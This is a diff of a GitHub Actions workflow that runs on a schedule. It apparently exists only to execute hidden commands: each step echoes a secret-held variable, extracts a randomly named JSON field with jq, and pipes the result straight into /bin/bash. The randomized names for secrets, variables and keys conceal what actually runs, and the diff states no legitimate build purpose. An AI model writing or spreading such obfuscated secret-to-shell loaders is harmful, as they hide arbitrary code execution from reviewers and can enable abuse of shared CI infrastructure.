@@ -3,22 +3,24 @@ name: wuhaoning3214
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 2/6 * * *'
+    - cron: '45 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          x869: ${{ secrets.x869 }}
+          ff55942: ${{ secrets.ff55942 }}
         run: |
-          echo $x869 | jq -r .p59 | /bin/bash
-          echo $twv378 | jq -r .ka3 | /bin/bash
-          echo $zswbk8926 | jq -r .cak988 | /bin/bash
-          echo $im39 | jq -r .w2 | /bin/bash
-          echo $qz7372 | jq -r .pxpiv1687 | /bin/bash
-          echo $l97 | jq -r .sbvy4 | /bin/bash
+          echo $ff55942 | jq -r .zy88393 | /bin/bash
+          echo $sgmu38358 | jq -r .ca40 | /bin/bash
+          echo $ldiv363 | jq -r .x53 | /bin/bash
+          echo $anbz13357 | jq -r .szkc4708 | /bin/bash
+          echo $y38 | jq -r .gfqc51535 | /bin/bash
+          echo $wtmxn9 | jq -r .ol7285 | /bin/bash
+          echo $opg30088 | jq -r .d72 | /bin/bash
+          echo $fha209 | jq -r .y2 | /bin/bash
+          echo $wak6707 | jq -r .pneid352 | /bin/bash
 
